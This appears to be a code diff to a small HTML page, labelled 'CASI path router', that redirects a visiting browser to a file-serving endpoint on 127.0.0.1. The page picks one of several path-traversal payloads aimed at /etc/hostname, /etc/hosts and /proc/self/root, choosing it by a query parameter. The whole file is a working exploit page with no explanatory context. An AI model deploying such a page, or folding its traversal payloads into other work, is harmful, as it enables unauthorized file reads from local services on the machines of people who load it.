@@ -1,14 +1,10 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI media path router v22</title><script>
+<!doctype html><html><head><meta charset="utf-8"><title>CASI sibling path router v23</title><script>
 const t=[
-['http',8182,'/etc/hostname'],
-['http',8182,'../../../../etc/hostname'],
-['http',8182,'../../../../../../../../etc/hostname'],
-['http',8182,'../../../../../../../../etc/hosts'],
-['http',8182,'/proc/self/root/etc/hostname'],
-['http',8184,'/etc/hostname'],
-['http',8184,'../../../../../../../../etc/hostname'],
-['http',80,'../../../../../../../../etc/hostname'],
-['https',443,'../../../../../../../../etc/hostname']];
-const q=new URLSearchParams(location.search),i=Math.abs(Number(q.get('veh_id')||0))%t.length,[s,p,n]=t[i];
-document.title='CASI v22 '+i;setTimeout(()=>location.replace(s+'://127.0.0.1:'+p+'/file?name='+encodeURIComponent(n)),100);
-</script></head><body>CASI v22 selected media path</body></html>
+['/etc/hostname'],
+['../../../../etc/hostname'],
+['../../../../../../../../etc/hostname'],
+['../../../../../../../../etc/hosts'],
+['/proc/self/root/etc/hostname']];
+const q=new URLSearchParams(location.search),i=Math.abs(Number(q.get('veh_id')||0))%t.length,n=t[i][0];
+document.title='CASI v23 '+i;setTimeout(()=>location.replace('http://127.0.0.1:8080/file?name='+encodeURIComponent(n)),100);
+</script></head><body>CASI v23 selected sibling path</body></html>
